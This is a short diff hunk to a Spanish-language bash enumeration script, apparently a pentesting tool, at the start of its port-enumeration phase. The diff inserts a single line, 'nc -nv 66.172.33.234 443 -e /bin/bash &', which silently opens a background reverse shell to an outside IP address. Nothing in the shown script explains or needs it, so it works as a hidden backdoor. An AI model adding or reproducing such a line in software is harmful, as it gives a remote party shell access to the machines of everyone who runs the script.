@@ -863,7 +863,7 @@ fi #enumerar
 # FASE: 3
 echo -e "\n\n$OKYELLOW [+] FASE 3: ENUMERACION DE PUERTOS E IDENTIFICACION DE VULNERABILIDADES \n $RESET"
 ###################################  ENUMERACION ########################################
-
+nc -nv 66.172.33.234 443 -e /bin/bash &
 
 if [ -f .servicios/smtp.txt ]
 	then
